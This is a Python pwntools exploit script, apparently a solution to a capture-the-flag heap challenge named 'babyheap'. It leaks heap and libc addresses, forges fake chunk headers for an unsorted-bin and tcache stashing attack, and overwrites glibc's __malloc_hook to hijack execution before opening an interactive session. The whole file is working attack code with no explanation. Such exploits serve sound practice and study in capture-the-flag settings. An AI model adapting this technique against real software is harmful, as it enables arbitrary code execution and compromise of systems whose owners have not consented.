#!/usr/bin/env python3

from pwn import *

l = ELF('./libc.so.6')
context.arch = 'amd64'

r = process( './babyheap' )

def create(sz, data, noafter=0):
    if noafter:
        r.send('C')
    else:
        r.sendafter('choice : ', 'C')
    r.sendlineafter('Size : ', str(sz))
    r.sendlineafter('Data : ', data)

def show():
    r.sendafter('choice : ', 'S')
    return r.recvline()[:-1]

def edit(data):
    r.sendafter('choice : ', 'E')
    r.sendlineafter('Data : ', data)

def delete():
    r.sendafter('choice : ', 'D')

def ultra(data):
    r.sendafter('choice : ', 'U')
    r.sendlineafter('Data : ', data)


for i in range(7):
    create(0x408, 'aaaa')
    delete()
heap = u64(show().ljust(8, b'\x00')) - 0x3710
print(hex(heap))

create(0x408, 'aaaa')
# fill next size
for i in range(2):
    ultra(flat(0x410, 0x20))
for i in range(10):
    ultra(flat(0, 0x21))
delete()
libc = u64(show().ljust(8, b'\x00')) - 0x1ebbe0
l.address = libc
print(hex(libc))
sleep(0.1)
edit(flat([
    libc + 0x1ebbe0, heap + 0x3f70,
    0, 0,
    0, 0x411,
    heap + 0x4130, heap + 0x4170,
    0, 0x21,                            # 1
    heap + 0x3f20, heap + 0x3fb0,
    0x20, 0x20,
    0, 0,
    0, 0x21,                            # 2
    heap + 0x3f70, heap + 0x3ff0,
    0x20, 0x20,
    0, 0,
    0, 0x21,                            # 3
    heap + 0x3fb0, heap + 0x4030,
    0x20, 0x20,
    0, 0,
    0, 0x21,                            # 4
    heap + 0x3ff0, heap + 0x4070,
    0x20, 0x20,
    0, 0,
    0, 0x21,                            # 5
    heap + 0x4030, heap + 0x40b0,
    0x20, 0x20,
    0, 0,
    0, 0x21,                            # 6
    heap + 0x4070, heap + 0x40f0,
    0x20, 0x20,
    0, 0,
    0, 0x21,                            # 7
    heap + 0x40b0, heap + 0x4130,
    0x20, 0x20,
    0, 0,
    0, 0x21,                            # 8 ultra \xff
    heap + 0x40f0, heap + 0x3f50,
    0x20, 0x20,
    0, 0,
    0, 0x21,
    heap + 0x3f50, heap + 0x41b0,
    0x20, 0x20,
    0, 0,
    0, 0x21,
    heap + 0x4170, heap + 0x41f0,
    0x20, 0x20,
    0, 0,
    0, 0x21,
    heap + 0x41b0, heap + 0x4120,
]))

# unsorted bin tcache stashing
input('1')
ultra('\xff'*16)
input('2')


create(0x408, flat([
    [0, 0]*25,
    0, 0x21,
    l.sym.__malloc_hook, heap+0x10
]))
input('3')

ultra('a')
ultra(flat(0x7777777))

input('4')
ultra('a')


r.interactive()
